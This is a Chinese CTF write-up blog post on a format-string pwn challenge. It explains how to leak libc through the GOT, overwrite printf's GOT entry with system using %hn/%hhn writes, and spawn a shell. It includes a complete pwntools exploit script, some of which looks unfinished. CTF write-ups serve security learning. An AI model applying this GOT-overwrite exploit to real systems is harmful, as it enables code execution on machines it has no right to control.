---
title: 网鼎杯第二场Fmt
date: 2018-08-22 08:37:40
tags: [CTF, PWN]
categories: 网鼎杯
---
## 网鼎杯 第二场 fmt  
​	学弟扔了网鼎杯的一道pwn给我，看了下发现是格式化字符串，恰巧昨天刚刚做了一道stack_check_fail劫持的格式化字符串题，今天又做格式化可以说还是比较轻松的。 
	<!--more-->
拿到题目一看发现是个中规中矩的格式化题目，有循环，供用户输入的缓冲区范围也比较大，漏洞就是直接printf字符串变量。  
	大致看了一下，先找到利用思路，可以通过泄露got表地址找到libc库，然后重新执行程序，第一次输入泄露libc函数地址，计算libc载入基地址，之后直接在栈上构造数据覆写printf的got表为system，因为参数保存在栈上，直接输入/bin/sh就能getshell了。  
	说轻松是很轻松，但那是整个解题思路，实际上在写脚本和调试的时候还是遇到不少坑的，比如说hhn和hn以及n的职能一开始没有分清导致调试的时候遇到不少坑，这里hhn是往目标地址写入一个字节，hn是两个，n是四字节，lln是八字节，可以按情况对数据进行字节拆分后写入目标地址空间。了解了以后做就很简单了。

```
from pwn import *
p=process('./pwn')
gdb.attach(p,'''
	break *0x080485BB
	break *0x080485ca
	continue
''')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
p.recvuntil('Do you know repeater?\n')
p.sendline(p32(elf.got['read']))
p.sendline('%6$s')
read_address=int((p.recv(12)[5:9][::-1]).encode('hex'),16)
log.info('read_address > '+hex(read_address))
libc_base=read_address-libc.symbols['read']
log.info('libc_base > '+hex(libc_base))
system_address=libc_base+libc.symbols['system']
log.info('system > '+hex(system_address))
payload=p32(elf.got['printf'])+p32(elf.got['printf']+2)
len1=(system_address & 0xffff)
len2=((system_address >> 16) &0xff)
#len3=(system_address>>16)&0xff
#print hex(len2)+' is len2'
payload+='%'+str(len1-8) + 'x%6$hn'
payload+='%'+str(len2) + 'x%7$hhn'
#payload+='%'+str(len3) + 'x%8$hn'
#print payload
#p.sendline('%01x%6$hhn'+'%1x%7$hhn'+'%2x%8$hhn')
p.send(payload)
p.sendline('/bin/sh')
p.interactive()

```

